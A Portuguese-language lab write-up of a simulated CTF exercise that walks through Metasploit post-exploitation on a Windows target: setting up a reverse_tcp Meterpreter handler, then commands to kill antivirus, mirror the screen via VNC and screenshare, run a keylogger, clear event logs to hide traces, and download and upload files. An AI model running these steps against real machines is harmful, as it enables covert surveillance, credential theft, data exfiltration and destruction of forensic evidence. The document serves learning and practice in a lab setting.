## Extração de dados com Metasploit

O objetivo é encontrar o arquivo chamado flag que criei dentro da pasta de documentos dentro de um usuário. É uma simulação básica de um CTF (Capture The Flag).

### 1º - Relembrando os comandos da configuração inicial para rodar o metasploit e o meterpreter, nesta sequência:

1 - sudo su (entrar no root do terminal do Kali)

2 - msfconsole (utilizado para iniciar a interface de linha de comando (CLI) principal do Metasploit Framework)

![msfconsole](https://i.imgur.com/dcMcEsI.jpeg)

3 - use multi/handler (é a infraestrutura de escuta que aguarda a "chamada telefônica de volta" do payload remoto para que a interação possa começar. Ele permite que o profissional de segurança configure o Metasploit para "escutar" em uma porta e endereço IP específicos, aguardando que a máquina alvo se conecte de volta, em vez de o Metasploit tentar iniciar a conexão diretamente - o que muitas vezes é bloqueado por firewalls).

4 - set payload windows/meterpreter/reverse_tcp (tem a função de selecionar e configurar este payload específico para estabelecer uma sessão reversa e interativa em um sistema operacional Windows comprometido). 

5 - set lhost (Define o endereço IP do seu host local - o computador que está usando o Kali Linux. Este endereço é utilizado para que a máquina alvo saiba onde se conectar de volta, especialmente em cenários de reverse shell - quando a máquina alvo inicia a conexão de volta para o atacante).

6 - set lport (Define em qual porta da minha máquina - o sistema Kali Linux - o Metasploit deve aguardar a conexão de volta da máquina alvo. Em um ataque de reverse shell, a máquina alvo é instruída a se conectar de volta ao atacante. O LPORT define a porta específica onde o Metasploit estará "ouvindo" ativamente essa conexão de entrada).

7 - run (ativa a funcionalidade do módulo que foi previamente configurado usando comandos como use e set).

![config](https://i.imgur.com/SKX3DAU.jpeg)

&nbsp;

### 2º - Rodar um comando que desliga o antivírus

Comando: run killav

ou

Comando: run post/windows/manage/killav

![killav](https://i.imgur.com/dQvGr3M.jpeg)

&nbsp;

### 3º - Rodar o comando VNC. 

Este comando é usado para iniciar um servidor Virtual Network Computing (VNC). Transforma a máquina Kali Linux em um host que pode transmitir sua tela e receber comandos de mouse e teclado de um visualizador (cliente) VNC remoto. 

O protocolo VNC é independente do sistema operacional, o que significa que um cliente VNC em qualquer plataforma pode se conectar a um servidor VNC no Kali Linux, e vice-versa. 

Tudo que o usuário faz na tela dele do Windows eu consigo ver na minha tela no Kali Linux através deste comando.

Comando: run vnc

![runvnc](https://i.imgur.com/JiNMicw.jpeg)

&nbsp;

![runvnc1](https://i.imgur.com/lutidTq.jpeg)

&nbsp;

### 4º - Rodar o comando screenshare.

Assim como o VNC, este comando espelha a tela da máquina invadida para mim, só que dessa vez no navegador do Kali Linux. Tem um atraso maior na atualização da tela.

Comando: screenshare

Comando: CTRL C (interrompe o screenshare)

![screenshare](https://i.imgur.com/NaiilR5.jpeg)

&nbsp;

![screenshare1](https://i.imgur.com/YwEAvKe.jpeg)

&nbsp;

### 5º - Rodar o comando keyscan 

Este comando é um sniffer, ou seja, consigo pegar tudo que o usuário digitar. Um sniffer é uma ferramenta (hardware ou software) usada para monitorar o tráfego de uma rede, "farejando" e capturando pacotes de dados para análise. Administradores de rede a utilizam para diagnosticar problemas e otimizar o desempenho da rede, enquanto invasores podem usá-la para roubar informações confidenciais. 

Comando: keyscan_start  

Este comando inicia um keylogger (registrador de teclas) no sistema remoto (vítima) comprometido. Ou seja, captura secretamente todas as teclas digitadas no teclado da máquina alvo. Os dados capturados são armazenados em um buffer na memória do sistema comprometido, minimizando o rastro forense em disco.

Comando: keyscan_dump

Este comando mostra as teclas que foram capturadas pelo keylogger remoto que foi previamente iniciado com o comando keyscan_start

Comando: keyscan_stop (serve para parar o keylogger (registrador de teclas) que está em execução no sistema remoto (máquina vítima).

![keyscanstartdump](https://i.imgur.com/eIBEGdN.jpeg)

&nbsp;

![keyscanstop](https://i.imgur.com/Fkm3n0j.jpeg)

&nbsp;

### 6º - Rodar o comando clearev

Este comando apaga os registros de eventos (logs) do sistema operacional Windows da máquina alvo. O objetivo deste comando é uma medida de antiforensics (antiforense): remover as evidências da atividade do testador de penetração (ou atacante) no sistema, dificultando que administradores de sistema ou investigadores forenses detectem a intrusão ou o que foi feito na máquina. 

É um comando específico para sistemas operacionais Windows e não funcionará em alvos Linux ou macOS dentro da sessão meterpreter.

Comando: clearev

![clearev](https://i.imgur.com/aj8MaA5.jpeg)

&nbsp;

### 7º - Efetuar download de arquivos da máquina alvo para minha máquina do Kali Linux.

1 - Fazer uma busca no diretório e tipo de arquivo que quero baixar. Neste exemplo o diretório é o C:/Users e o tipo de arquivo é txt.

Comando: search -d C:/Users -f *.txt

2 - Após encontrar o arquivo nós o baixamos com os comandos abaixo.

Comando: download -h (Mostra uma lista com algumas opções de downloads)

Comando: download C:/Users/renan/Documents/teste.txt 

![search](https://i.imgur.com/ZD6ckeu.jpeg)

&nbsp;

![download](https://i.imgur.com/PNgG41g.jpeg)

&nbsp;

![arquivo](https://i.imgur.com/KDby839.jpeg)

&nbsp;

### 8º - Efetuar upload da minha máquina do Kali Linux para a máquina alvo, que nesse caso é o windows.

1 - Criei um arquivo txt chamado teste-upload no Kali. 

Comando: upload -h (exibe o menu de ajuda ou as opções de uso do comando upload).

Comando: upload ./teste-upload C:/Users/renan/Documents (Faz upload do arquivo teste-upload do Kali para o Windows)

![upload1](https://i.imgur.com/M3O4DAP.jpeg)

&nbsp;

![upload2](https://i.imgur.com/hKAuQHT.jpeg)

&nbsp;

![upload3](https://i.imgur.com/HSOWJAn.jpeg)

&nbsp;

